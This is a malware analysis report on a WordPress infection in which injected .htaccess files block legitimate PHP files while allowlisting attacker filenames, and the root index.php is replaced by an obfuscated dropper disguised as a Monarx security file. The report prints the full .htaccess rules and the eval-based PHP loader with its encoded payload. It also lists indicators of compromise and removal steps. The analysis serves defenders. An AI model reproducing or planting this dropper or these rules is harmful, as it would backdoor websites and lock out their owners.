---
title: 'Malicious .htaccess Injection and Fake Index.php Dropper'
slug: 'htaccess-injection-fake-index-php-dropper'
reportDate: '2026-01-27'
threatType: 'Access Control Malware and Backdoor'
severity: 'High'
fileHash: 'index-php-obfuscated-dropper-htaccess-dos'
detectedPaths: ['htaccess-sample.txt', 'index.php.txt']
screenshots:
  [
    '/images/wordpress-threats/index-php-obfuscated-dropper-htaccess-dos_evidence-1.png',
    '/images/wordpress-threats/index-php-obfuscated-dropper-htaccess-dos_evidence-2.png',
    '/images/wordpress-threats/index-php-obfuscated-dropper-htaccess-dos_evidence-3.png',
    '/images/wordpress-threats/index-php-obfuscated-dropper-htaccess-dos_evidence-4.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'Website functionality is severely impaired due to restricted access, leading to 403 and 500 errors. The malicious dropper can enable further exploitation, risking data exposure and further infections.'
seenOn: 'Root directory (index.php) and all subdirectories (.htaccess)'
behavior: 'Restricts legitimate access and maintains a persistent backdoor.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'N/A'
---

## Technical Analysis

The attack employs a dual-component infection that manipulates access controls via recursive .htaccess files. These files use 'FilesMatch' directives to block access to legitimate files while allowing access to specific malware. The altered index.php serves as a 'Monarx' dropper with obfuscated PHP code executed via base64_decode, str_rot13, and eval, which maintains a persistent backdoor in the system. The .htaccess files hide in the themes, plugins, and uploads directories, while the index.php resides at the site's root.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. Infection restricts access to critical files by modifying .htaccess rules.
2. The root index.php gets replaced with a malicious backdoor/dropper.
3. Malicious code remains active due to obfuscation techniques, allowing ongoing unauthorized access.

## Code Signature(s)

### FILE: `.htaccess`

```bash
<FilesMatch ".(py|exe|php)$">
 Order allow,deny
 Deny from all
</FilesMatch>
<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php|mah.php|jp.php|ext.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
```

### FILE: `index.php`

```php
<?php
/**================================================================================================
___  ___
|  \/  | Copyright (C) 2017-2023, Monarx, Inc.
| .  . |  ___   _ __    __ _  _ __ __  __
| |\/| | / _ \ | '_ \  / _` || '__|\ \/ /
| |  | || (_) || | | || (_| || |    >  <
\_|  |_/ \___/ |_| |_| \__,_||_|   /_/\_\

===================================================================================================
@package    Monarx Security Site Analyzer
@file		monarx-analyzer.php
@copyright	Monarx, Inc. Not for external use, redistribution, or sale.
@site       https://www.monarx.com
===================================================================================================**/ $L86Rgr=explode(base64_decode("Pz4="),file_get_contents/*******/(__FILE__)); $L8CRgr=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($L86Rgr[1]))));$L7CRgr = "da80272e07125534086f34ae475bec51";preg_replace($L8CRgr[0],serialize(/****/@eval/****/($L8CRgr[2])),$L8CRgr[1]);exit();?>==Dstfmoz5JnxNvolIUqyWUV7xFXa0lWtbQVaD1Wt8QVcNQZlNQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlW0qPV/NFXjNwZjtUZtLPVm1zpyOUWbtPV/NFXkNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXlNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/NFX0NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xFXa0lWtbQVaZ1Wt8QVcNQZ0NQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlWmqPV/NFXjNQAjtUZtLPVm1zpyOUWbtPV/NFX4NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXjRQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/NFXjVQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xFXa0lWtbQVaZ1Wt8QVcNQZ4NQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlWmqPV/NFXjNQBjtUZtLPVm1zpyOUWbtPV/NFXjDQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXjtQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/NFXjNGZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV9OlBaH3Wt0QViMzocEPV7OFMmkJMt0UV7pPpaNFCt8zMhyTWtfUVcNQZjRQrjNFC9NFXjNQZktUZtLPVm1zpyOUWbtPVzyJMmkJMt0UV7plLaNFCt8zMhyTWtfUVcNQZjVQrjNFC9NFXjNQZltUZtLPVm1zpyOUWbtPVzyJMmkJMt0UV7pPMaNFCt8zMhyTWtfUVcNQZjDQrjN
```

## Indicators of Compromise (IOCs)

- `about.php`
- `radio.php`
- `lock360.php`
- `mah.php`
- `jp.php`

## Removal Protocol

1. Remove all recursively altered .htaccess files from directories.
1. Restore the index.php from the WordPress repository.
1. Scan and remove any identified malicious files like about.php, radio.php, and lock360.php.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
